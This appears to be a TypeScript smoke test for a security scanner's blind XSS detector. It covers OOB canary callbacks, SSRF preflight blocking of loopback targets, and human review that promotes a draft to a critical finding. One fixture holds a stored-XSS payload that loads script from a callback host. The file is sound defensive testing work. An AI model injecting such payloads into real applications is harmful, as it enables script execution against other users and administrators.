/**
 * Milestone P7-3 — Blind XSS Interaction Probe Smoke Suite (Phase 7 Finale)
 *
 * Assertions:
 * 1. Detects blind XSS when parameter injection triggers an inbound OOB callback validated by OobCanaryManager.
 * 2. Cleanly abstains (secure_target_abstained) when no callback interaction is recorded.
 * 3. Preflight SSRF protection (blocks loopback/metadata targets).
 * 4. Full HITL review lifecycle promotes Blind XSS draft to formal Finding.
 * 5. Helper tests verify isXssCandidateParameter detection accuracy.
 */

import { DETECTION_CONTRACT_VERSION } from '../detection/DetectionContracts.js';
import type {
  IdorHttpProbeTransport,
  HttpProbeRequest,
  HttpProbeResponse,
} from '../detection/DetectionContracts.js';
import {
  runBlindXssDetection,
  isXssCandidateParameter,
} from '../detection/BlindXssDetectionService.js';
import { OobCanaryManager } from '../oob/OobCanaryManager.js';
import { establishVerifiedAuthorizationDecision } from '../authorization/VerifiedAuthorizationDecisionService.js';
import { InMemoryOrchestratedAssessmentRepository } from '../storage/InMemoryOrchestratedAssessmentRepository.js';
import { OrchestratedAssessmentApplicationService } from '../application/OrchestratedAssessmentApplicationService.js';
import type { AuthorizedScopeGrant } from '../scope/AuthorizedScopeContracts.js';
import type { OrchestratedAssessmentRecord } from '../application/OrchestratedAssessmentContracts.js';

async function runSmokeSuite(): Promise<void> {
  console.log('=== Milestone P7-3: Blind XSS Interaction Probe Smoke Suite ===');

  const nowIso = new Date().toISOString();
  const assessmentId = 'asm_smoke_p7_3_001';
  const scanId = 'scn_smoke_p7_3_001';
  const grantId = 'grn_smoke_p7_3_001';
  const decisionId = 'dec_smoke_p7_3_001';
  const actorId = 'usr_sec_auditor_p73';

  const validScopeGrant: AuthorizedScopeGrant = {
    contractVersion: 'fixguard-authorized-scope-policy/v0',
    kind: 'authorized_scope_grant',
    grantId,
    scanId,
    issuedAt: new Date(Date.now() - 3600_000).toISOString(),
    expiresAt: new Date(Date.now() + 86400_000).toISOString(),
    subject: {
      targetKind: 'origin',
      normalizedOrigin: 'https://app.example.com',
    },
    authorizationBasis: {
      basisKind: 'internal_asset_record',
      recordedBy: 'human_user',
      authorizationText: 'Authorized for Milestone P7-3 Blind XSS smoke test',
    },
    permissionSet: {
      passiveRecon: true,
      technologyFingerprinting: true,
      endpointDiscovery: true,
      activeCrawling: true,
      authenticatedTesting: true,
      lightValidation: true,
      activeValidation: true,
      aggressiveValidation: false,
      oobTesting: true,
      destructiveOperations: false,
    },
    boundaries: {
      allowedDomains: ['app.example.com'],
      allowedHosts: ['app.example.com'],
      allowedOrigins: ['https://app.example.com'],
      allowedMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'],
    },
    constraints: {
      allowLoginRequiredAreas: true,
      allowStateChangingRequests: false,
      allowCredentialUse: true,
      allowOobCallbacks: true,
      allowThirdPartyTargets: false,
    },
    classification: {
      createsRealFindings: false,
      createsPersistedEvidence: false,
      confirmsVulnerabilities: false,
      makesRiskClaims: false,
      makesSeverityClaims: false,
      makesImpactClaims: false,
      executesNetwork: false,
      executesTools: false,
      persistsData: false,
    },
  };

  const authRes = establishVerifiedAuthorizationDecision(
    {
      contractVersion: 'fixguard-verified-authorization-decision/v0',
      kind: 'establish_verified_authorization_decision_request',
      assessmentId,
      scanId,
      authorizationDecisionId: decisionId,
      authorizedActor: { actorId, actorType: 'human' },
      decision: 'authorized',
      decidedAt: nowIso,
      scopeGrant: validScopeGrant,
    },
    nowIso
  );

  if (authRes.status !== 'established' || !authRes.decision) {
    throw new Error(`Failed to establish verified authorization: ${authRes.reasonCode}`);
  }

  const decision = authRes.decision;

  const dummyTransport: IdorHttpProbeTransport = async (_req: HttpProbeRequest): Promise<HttpProbeResponse> => {
    return {
      statusCode: 200,
      headers: { 'content-type': 'text/html' },
      bodyText: '<html><body>Comment submitted successfully</body></html>',
      responseTimeMs: 25,
    };
  };

  const dummyDnsResolver = async (_host: string) => ['93.184.216.34'];

  // -------------------------------------------------------------------------
  // Test 1: Blind XSS Detection with Confirmed OOB Script Execution Callback
  // -------------------------------------------------------------------------
  console.log('[TEST 1] Testing Blind XSS detection with confirmed OOB script callback...');
  const isolatedOobManager = new OobCanaryManager({ defaultCallbackDomain: 'oob.test.local' });

  // Custom transport that automatically simulates stored payload execution in an admin browser loading the canary script
  const interactiveTransport: IdorHttpProbeTransport = async (req: HttpProbeRequest): Promise<HttpProbeResponse> => {
    // Simulate stored script execution in background admin console
    const bodyStr = req.body ?? '';
    if (bodyStr.includes('<script src=')) {
      const match = bodyStr.match(/src=\\"https:\/\/([^/\\]+)/) || bodyStr.match(/src="https:\/\/([^/"]+)/);
      if (match && match[1]) {
        const canaryToken = match[1].split('.')[0] ?? '';
        isolatedOobManager.recordInteraction({
          canaryToken,
          interactionType: 'http_callback',
          remoteAddress: '198.51.100.88',
          receivedAt: new Date().toISOString(),
          httpMethod: 'GET',
        });
      }
    }
    return {
      statusCode: 200,
      headers: { 'content-type': 'application/json' },
      bodyText: JSON.stringify({ status: 'comment_created', id: 402 }),
      responseTimeMs: 40,
    };
  };

  const result1 = await runBlindXssDetection(
    {
      contractVersion: DETECTION_CONTRACT_VERSION,
      kind: 'blind_xss_detection_request',
      detectionId: 'det_bxss_test_01',
      assessmentId,
      scanId,
      authorizationGrantId: grantId,
      authorizationDecisionId: decision.authorizationDecisionId,
      actorId,
      endpointUrl: 'https://app.example.com/api/v1/comments/submit',
      parameterName: 'comment',
      method: 'POST',
      verifiedAuthorizationDecision: decision,
      scopeGrant: validScopeGrant,
      transport: interactiveTransport,
      dnsResolver: dummyDnsResolver,
    },
    isolatedOobManager
  );

  if (result1.status !== 'pending_human_review' || !result1.interactionConfirmed || !result1.evidenceDraft) {
    throw new Error(`Test 1 Failed: Expected pending_human_review with confirmed interaction, got status=${result1.status}, reasonCode=${result1.reasonCode}, confirmed=${result1.interactionConfirmed}`);
  }
  console.log(`[TEST 1] PASS: Flagged Blind XSS draft: ${result1.evidenceDraft.draftId}, canary: ${result1.canaryToken}, remote: ${result1.remoteAddress}`);

  // -------------------------------------------------------------------------
  // Test 2: Abstention on Uncontacted Canary
  // -------------------------------------------------------------------------
  console.log('[TEST 2] Verifying abstention on untouched canary token...');
  const result2 = await runBlindXssDetection(
    {
      contractVersion: DETECTION_CONTRACT_VERSION,
      kind: 'blind_xss_detection_request',
      detectionId: 'det_bxss_test_02',
      assessmentId,
      scanId,
      authorizationGrantId: grantId,
      authorizationDecisionId: decision.authorizationDecisionId,
      actorId,
      endpointUrl: 'https://app.example.com/api/v1/feedback/submit',
      parameterName: 'feedback',
      method: 'POST',
      verifiedAuthorizationDecision: decision,
      scopeGrant: validScopeGrant,
      transport: dummyTransport,
      dnsResolver: dummyDnsResolver,
    },
    isolatedOobManager
  );

  if (result2.status !== 'secure_target_abstained' || result2.interactionConfirmed) {
    throw new Error(`Test 2 Failed: Expected secure_target_abstained, got status=${result2.status}`);
  }
  console.log('[TEST 2] PASS: Cleanly abstained with zero findings on uncontacted canary.');

  // -------------------------------------------------------------------------
  // Test 3: Preflight SSRF Protection
  // -------------------------------------------------------------------------
  console.log('[TEST 3] Verifying preflight SSRF protection against loopback/metadata...');
  const loopbackScopeGrant: AuthorizedScopeGrant = {
    ...validScopeGrant,
    grantId: 'grn_smoke_p7_3_loopback',
    scanId,
    subject: {
      targetKind: 'origin',
      normalizedOrigin: 'http://127.0.0.1:8080',
    },
    boundaries: {
      ...validScopeGrant.boundaries,
      allowedDomains: ['127.0.0.1'],
      allowedHosts: ['127.0.0.1'],
      allowedOrigins: ['http://127.0.0.1:8080'],
    },
  };

  const loopbackAuthRes = establishVerifiedAuthorizationDecision(
    {
      contractVersion: 'fixguard-verified-authorization-decision/v0',
      kind: 'establish_verified_authorization_decision_request',
      assessmentId,
      scanId,
      authorizationDecisionId: 'dec_smoke_p7_3_loopback',
      authorizedActor: { actorId, actorType: 'human' },
      decision: 'authorized',
      decidedAt: nowIso,
      scopeGrant: loopbackScopeGrant,
    },
    nowIso
  );

  if (loopbackAuthRes.status !== 'established' || !loopbackAuthRes.decision) {
    throw new Error(`Failed to establish loopback verified authorization: ${loopbackAuthRes.reasonCode}`);
  }

  const loopbackDecision = loopbackAuthRes.decision;

  const result3 = await runBlindXssDetection(
    {
      contractVersion: DETECTION_CONTRACT_VERSION,
      kind: 'blind_xss_detection_request',
      detectionId: 'det_bxss_test_03',
      assessmentId,
      scanId,
      authorizationGrantId: loopbackScopeGrant.grantId,
      authorizationDecisionId: loopbackDecision.authorizationDecisionId,
      actorId,
      endpointUrl: 'http://127.0.0.1:8080/admin/logs',
      parameterName: 'message',
      method: 'POST',
      verifiedAuthorizationDecision: loopbackDecision,
      scopeGrant: loopbackScopeGrant,
      transport: dummyTransport,
      dnsResolver: async () => ['127.0.0.1'],
    },
    isolatedOobManager
  );

  if (result3.status !== 'preflight_denied') {
    throw new Error(`Test 3 Failed: Expected preflight_denied for loopback target, got status=${result3.status}`);
  }
  console.log('[TEST 3] PASS: Preflight successfully blocked loopback probe.');

  // -------------------------------------------------------------------------
  // Test 4: HITL Review Lifecycle
  // -------------------------------------------------------------------------
  console.log('[TEST 4] Testing HITL review lifecycle promoting Blind XSS draft to formal Finding...');
  const repo = new InMemoryOrchestratedAssessmentRepository();
  const appService = new OrchestratedAssessmentApplicationService({
    repository: repo,
  });

  const testAssessmentId = 'asm_bxss_rev_001';
  const testScanId = 'scn_bxss_rev_001';
  const draftId = 'dft_bxss_rev_001';

  const initialRecord = {
    contractVersion: 'fixguard-orchestrated-assessment/v0' as const,
    assessmentId: testAssessmentId,
    scanId: testScanId,
    targetDomain: 'app.example.com',
    status: 'completed' as const,
    lineage: {
      assessmentId: testAssessmentId,
      scanId: testScanId,
      authorizationGrantId: validScopeGrant.grantId,
      authorizationDecisionId: decision.authorizationDecisionId,
      actorId: 'usr_sec_auditor_p73',
    },
    stages: [],
    timing: { startedAt: nowIso, completedAt: nowIso, durationMs: 150 },
    errorCount: 0,
    warningCount: 0,
    findings: [],
    pendingEvidenceDrafts: [
      {
        draftKind: 'non_persisted_comparison_evidence_draft' as const,
        draftId,
        suggestedEvidenceType: 'http_difference' as const,
        suggestedStrength: 'strong' as const,
        sourceComparisonId: 'cmp_bxss_rev_001',
        sourceSnapshotIds: {
          baselineSnapshotId: 'snp_base_001',
          validationSnapshotId: 'snp_val_001',
        },
        requiresHumanReview: true as const,
        notPersisted: true as const,
        notARealFinding: true as const,
        notConfirmedEvidence: true as const,
        notForExternalDelivery: true as const,
        notM45EvidenceRecord: true as const,
        safeRationale: 'Confirmed blind XSS on parameter comment at https://app.example.com/api/v1/comments/submit.',
        differentialContext: {
          endpointUrl: 'https://app.example.com/api/v1/comments/submit',
          detectionKind: 'blind_xss' as const,
          parameterName: 'comment',
          injectedPayloadSnippet: '"><script src="https://oob.test.local/c/fgc_test_canary_02"></script>',
          canaryToken: 'fgc_test_canary_02',
          interactionConfirmed: true,
          remoteAddress: '198.51.100.88',
          exposureSeverity: 'critical' as const,
          validationStatusCode: 200,
        },
      },
    ],
    recommendations: [],
  };

  await repo.save(initialRecord);

  const reviewRes = await appService.reviewEvidenceDraft({
    assessmentId: testAssessmentId,
    draftId,
    decision: 'approve_evidence',
    reviewerId: 'usr_sec_auditor_p73',
    reviewedAt: nowIso,
    notes: 'Confirmed stored XSS payload executed in internal admin console during comment moderation.',
  });

  if (!reviewRes.findingCreated || reviewRes.findingCreated.type !== 'CROSS_SITE_SCRIPTING') {
    throw new Error(`Test 4 Failed: Expected promoted finding of type CROSS_SITE_SCRIPTING, got ${JSON.stringify(reviewRes.findingCreated)}`);
  }

  if (reviewRes.findingCreated.severity !== 'critical') {
    throw new Error(`Test 4 Failed: Expected critical severity, got ${reviewRes.findingCreated.severity}`);
  }

  const updated = await repo.findById(testAssessmentId);
  if (!updated) {
    throw new Error('Test 4 Failed: Assessment not found in repository');
  }

  const promotedFinding = updated.findings.find((f) => f.id.startsWith('fnd_bxss_'));
  if (!promotedFinding) {
    throw new Error('Test 4 Failed: Expected promoted Blind XSS finding in repository');
  }

  console.log(`[TEST 4] PASS: Promoted Blind XSS finding verified: ${promotedFinding.id} (${promotedFinding.title})`);

  // -------------------------------------------------------------------------
  // Test 5: Parameter Classifier Helper
  // -------------------------------------------------------------------------
  console.log('[TEST 5] Testing isXssCandidateParameter helper...');
  if (!isXssCandidateParameter('comment') || !isXssCandidateParameter('feedback') || !isXssCandidateParameter('user_name')) {
    throw new Error('Test 5 Failed: isXssCandidateParameter failed for candidate params');
  }
  if (isXssCandidateParameter('id') || isXssCandidateParameter('page_number') || isXssCandidateParameter('token')) {
    throw new Error('Test 5 Failed: isXssCandidateParameter falsely flagged non-XSS params');
  }
  console.log('[TEST 5] PASS: isXssCandidateParameter verified.');

  console.log('\n[ALL TESTS PASSED] Milestone P7-3 Blind XSS Interaction Probe certified!\n');
}

runSmokeSuite().catch((err) => {
  console.error('[SMOKE TEST FAILED]', err);
  process.exit(1);
});
